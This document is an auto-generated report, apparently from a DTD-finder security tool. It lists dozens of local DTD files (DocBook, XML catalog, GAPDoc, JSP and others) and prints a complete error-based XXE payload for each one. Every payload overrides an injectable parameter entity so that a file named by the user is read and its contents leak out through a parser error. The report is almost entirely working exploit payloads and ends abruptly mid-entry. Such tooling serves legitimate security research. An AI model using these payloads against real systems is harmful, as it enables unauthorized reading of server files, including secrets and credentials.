# DTD founds
**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/yelp-dtd/docbookx.dtd`

**Injectable entity:** `ISOamsa`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/yelp-dtd/docbookx.dtd">

    <!ENTITY % ISOamsa '
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        '>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/xmlcore/catalog.dtd`

**Injectable entity:** `publicIdentifier`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/xmlcore/catalog.dtd">

    <!ENTITY % publicIdentifier '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/xmlcore/catalog.dtd`

**Injectable entity:** `partialPublicIdentifier`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/xmlcore/catalog.dtd">

    <!ENTITY % partialPublicIdentifier '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/xmlcore/catalog.dtd`

**Injectable entity:** `uriReference`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/xmlcore/catalog.dtd">

    <!ENTITY % uriReference '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/xmlcore/catalog.dtd`

**Injectable entity:** `string`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/xmlcore/catalog.dtd">

    <!ENTITY % string '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/xmlcore/catalog.dtd`

**Injectable entity:** `systemOrPublic`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/xmlcore/catalog.dtd">

    <!ENTITY % systemOrPublic '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/xmlcore/catalog.dtd`

**Injectable entity:** `nsdecl`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/xmlcore/catalog.dtd">

    <!ENTITY % nsdecl '>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/xmlcore/catalog.dtd`

**Injectable entity:** `public`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/xmlcore/catalog.dtd">

    <!ENTITY % public 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/xmlcore/catalog.dtd`

**Injectable entity:** `system`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/xmlcore/catalog.dtd">

    <!ENTITY % system 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/xmlcore/catalog.dtd`

**Injectable entity:** `uri`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/xmlcore/catalog.dtd">

    <!ENTITY % uri 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/xmlcore/catalog.dtd`

**Injectable entity:** `rewriteSystem`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/xmlcore/catalog.dtd">

    <!ENTITY % rewriteSystem 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/xmlcore/catalog.dtd`

**Injectable entity:** `rewriteURI`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/xmlcore/catalog.dtd">

    <!ENTITY % rewriteURI 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/xmlcore/catalog.dtd`

**Injectable entity:** `delegatePublic`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/xmlcore/catalog.dtd">

    <!ENTITY % delegatePublic 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/xmlcore/catalog.dtd`

**Injectable entity:** `delegateSystem`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/xmlcore/catalog.dtd">

    <!ENTITY % delegateSystem 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/xmlcore/catalog.dtd`

**Injectable entity:** `delegateURI`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/xmlcore/catalog.dtd">

    <!ENTITY % delegateURI 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/xmlcore/catalog.dtd`

**Injectable entity:** `nextCatalog`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/xmlcore/catalog.dtd">

    <!ENTITY % nextCatalog 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/xmlcore/catalog.dtd`

**Injectable entity:** `group`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/xmlcore/catalog.dtd">

    <!ENTITY % group 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/xmlcore/catalog.dtd`

**Injectable entity:** `local.catalog.attribs`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/xmlcore/catalog.dtd">

    <!ENTITY % local.catalog.attribs '>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/xmlcore/catalog.dtd`

**Injectable entity:** `local.public.attribs`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/xmlcore/catalog.dtd">

    <!ENTITY % local.public.attribs '>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/xmlcore/catalog.dtd`

**Injectable entity:** `local.system.attribs`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/xmlcore/catalog.dtd">

    <!ENTITY % local.system.attribs '>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/xmlcore/catalog.dtd`

**Injectable entity:** `local.uri.attribs`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/xmlcore/catalog.dtd">

    <!ENTITY % local.uri.attribs '>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/xmlcore/catalog.dtd`

**Injectable entity:** `local.rewriteSystem.attribs`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/xmlcore/catalog.dtd">

    <!ENTITY % local.rewriteSystem.attribs '>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/xmlcore/catalog.dtd`

**Injectable entity:** `local.rewriteURI.attribs`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/xmlcore/catalog.dtd">

    <!ENTITY % local.rewriteURI.attribs '>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/xmlcore/catalog.dtd`

**Injectable entity:** `local.delegatePublic.attribs`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/xmlcore/catalog.dtd">

    <!ENTITY % local.delegatePublic.attribs '>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/xmlcore/catalog.dtd`

**Injectable entity:** `local.delegateSystem.attribs`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/xmlcore/catalog.dtd">

    <!ENTITY % local.delegateSystem.attribs '>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/xmlcore/catalog.dtd`

**Injectable entity:** `local.delegateURI.attribs`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/xmlcore/catalog.dtd">

    <!ENTITY % local.delegateURI.attribs '>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/xmlcore/catalog.dtd`

**Injectable entity:** `local.nextCatalog.attribs`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/xmlcore/catalog.dtd">

    <!ENTITY % local.nextCatalog.attribs '>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/xmlcore/catalog.dtd`

**Injectable entity:** `local.group.attribs`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/xmlcore/catalog.dtd">

    <!ENTITY % local.group.attribs '>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/gapdoc/bibxmlext.dtd`

**Injectable entity:** `n.InProceedings`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/gapdoc/bibxmlext.dtd">

    <!ENTITY % n.InProceedings 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/gapdoc/bibxmlext.dtd`

**Injectable entity:** `n.PHDThesis`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/gapdoc/bibxmlext.dtd">

    <!ENTITY % n.PHDThesis 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/gapdoc/bibxmlext.dtd`

**Injectable entity:** `withMURL`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/gapdoc/bibxmlext.dtd">

    <!ENTITY % withMURL '(aa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/gapdoc/gapdoc.dtd`

**Injectable entity:** `InnerText`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/gapdoc/gapdoc.dtd">

    <!ENTITY % InnerText 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/gapdoc/gapdoc.dtd`

**Injectable entity:** `Text`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/gapdoc/gapdoc.dtd">

    <!ENTITY % Text 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/gtksourceview/language.dtd`

**Injectable entity:** `itemattrs`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/gtksourceview/language.dtd">

    <!ENTITY % itemattrs '>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/libgweather/locations.dtd`

**Injectable entity:** `name`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/libgweather/locations.dtd">

    <!ENTITY % name 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/jspxml.dtd`

**Injectable entity:** `URI`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/jspxml.dtd">

    <!ENTITY % URI '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/jspxml.dtd`

**Injectable entity:** `UriList`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/jspxml.dtd">

    <!ENTITY % UriList '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/jspxml.dtd`

**Injectable entity:** `URL`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/jspxml.dtd">

    <!ENTITY % URL '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/jspxml.dtd`

**Injectable entity:** `BeanID`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/jspxml.dtd">

    <!ENTITY % BeanID '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/jspxml.dtd`

**Injectable entity:** `ClassName`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/jspxml.dtd">

    <!ENTITY % ClassName '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/jspxml.dtd`

